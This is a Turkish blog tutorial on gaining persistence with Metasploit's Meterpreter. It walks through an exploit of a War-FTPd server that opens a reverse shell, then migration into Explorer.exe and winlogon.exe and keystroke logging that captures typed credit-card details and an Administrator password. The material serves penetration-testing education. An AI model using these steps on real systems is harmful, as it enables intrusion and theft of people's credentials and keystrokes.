---
draft: false

title:  'MSF Meterpreter Kalıcılık Sağlama'
date: '2017-06-15T13:54:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Bir hedef bilgisayara başarılı bir oturum açtığınızda, mevcut yetkiler izin veriyorsa ilk düşünülmesi gereken kalıcılık sağlamaktır. Kalıcılık, hedef sisteme daha sonradan giriş için açık kapılar oluşturulması veya daha kolay giriş yöntemleri bulunmasını kapsar.' 
 
url:  /tr/msf-meterpreter-kalicilik-saglama/ 
post_views_count:
    - '0'
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


## Kalıcılık Sağlama



Bir hedef bilgisayara başarılı bir oturum açtığınızda, mevcut yetkiler izin veriyorsa ilk düşünülmesi gereken kalıcılık sağlamaktır. Kalıcılık, hedef sisteme daha sonradan giriş için açık kapılar oluşturulması veya daha kolay giriş yöntemleri bulunmasını kapsar.



Bazı durumlarda, hedef üzerinde yaptığınız çalışmalar sistemi kararsız hale getirebilir. Sistemin tekrar başlatılması gerektiğinde bağlantınız da kopacaktır. Bu gibi durumlar için, hedef sisteme tekrar bağlanmanın kolay bir yolunu oluşturmak faydalı olacaktır.



Kalıcılık sağlamak için sistem hakkında kullanıcı bilgileri, token bilgileri, hash bilgileri ve bağlı olduğu diğer alt ağların keşfi ileride kullanım için oldukça fayda sağlamaktadır.



Bilgi toplamanın bir yöntemi de keylogger olarak ifade edilen yöntemdir.



## Metasploit içinde Keylogger Kullanımı



Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. Çok hızlı olmak veya çok yavaş olmak. Keylogger, yani kullanıcının tuşlarını ve yazdıklarını kaydetmek, yavaş yaklaşıma bir örnektir. Bu yaklaşımda, gerçekleştirmek istediğiniz işlemleri çok hızlı yapamazsınız ancak uzun vadede çok kullanışlı bilgiler elde edebilirsiniz.



Öncelikle, bir exploit modülü kullanarak hedef sistemde oturum çalım.


```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> Meterpreter session 4 opened (172.16.104.130:4444 -> 172.16.104.145:1246)

meterpreter >
```



Oturum açıldıktan sonra, tuşları kayıt etmek için `Explorer.exe` prosesine geçmek başarı için daha garanti bir yoldur. Hedef sistemde `Explorer.exe` uygulaması, hangi PID numarasıyla çalışıyor öğreniyoruz ve `migrate` komutuyla geçiş yapıyoruz.


```bash
meterpreter > ps

Process list
**============**

    PID   Name               Path                                                   
    ---   ----               ----                                                   
    140   smss.exe           \SystemRoot\System32\smss.exe                          
    188   winlogon.exe       ??\C:\WINNT\system32\winlogon.exe                     
    216   services.exe       C:\WINNT\system32\services.exe                         
    228   lsass.exe          C:\WINNT\system32\lsass.exe                            
    380   svchost.exe        C:\WINNT\system32\svchost.exe                          
    408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                          
    444   svchost.exe        C:\WINNT\System32\svchost.exe                          
    480   regsvc.exe         C:\WINNT\system32\regsvc.exe                           
    500   MSTask.exe         C:\WINNT\system32\MSTask.exe                           
    528   VMwareService.exe  C:\Program Files\VMwareVMware Tools\VMwareService.exe 
    588   WinMgmt.exe        C:\WINNT\System32\WBEMWinMgmt.exe                     
    664   notepad.exe        C:\WINNT\System32 otepad.exe                          
    724   cmd.exe            C:\WINNT\System32\cmd.exe                              
    768   Explorer.exe       C:\WINNT\Explorer.exe                                  
    800   war-ftpd.exe       C:\Program Files\War-ftpd\war-ftpd.exe                 
    888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe    
    896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe    
    940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe           
    972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe 
    1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe 

meterpreter > migrate 768
> Migrating to 768...
> Migration completed successfully.
meterpreter > getpid
Current pid: 768
```



PID geçişini kontrol ettikten sonra keylogger işlemini başlatalım.


```bash
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
   tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
```



Bir miktar süre geçtikten sonra kayıt dosyasını görmek için `keyscan_dump` komutunu kullanabilirsiniz. Yakalanan tuş vuruşlarını incelediğinizde, CTRL veya ALT gibi tuşların log dosyasına nasıl kayıt edildiğini de öğrenebilirsiniz.



Ayrıca, oturum açma bilgilerini de yakalamak isterseniz, `Explorer.exe` yerine `migrate` komutuyla, `winlogon` prosesine geçebilirsiniz.


```bash
meterpreter > ps

Process list
**=================**

PID Name         Path
--- ----         ----
401 winlogon.exe C:\WINNT\system32\winlogon.exe

meterpreter > migrate 401

> Migrating to 401...
> Migration completed successfully.

meterpreter > keyscan_start
Starting the keystroke sniffer...
```



Kayıt esnasında bir Administrator kullanıcı oturumu açılmıştır. Sonucuna bakalım.


```bash
meterpreter > keyscan_dump
Dumping captured keystrokes...
Administrator ohnoes1vebeenh4x0red!
```



Görüldüğü gibi, oturum açan kullanıcı “Administrator” ve parolası “ohnoes1vebeenh4x0red!” olarak tespit edilmiştir.
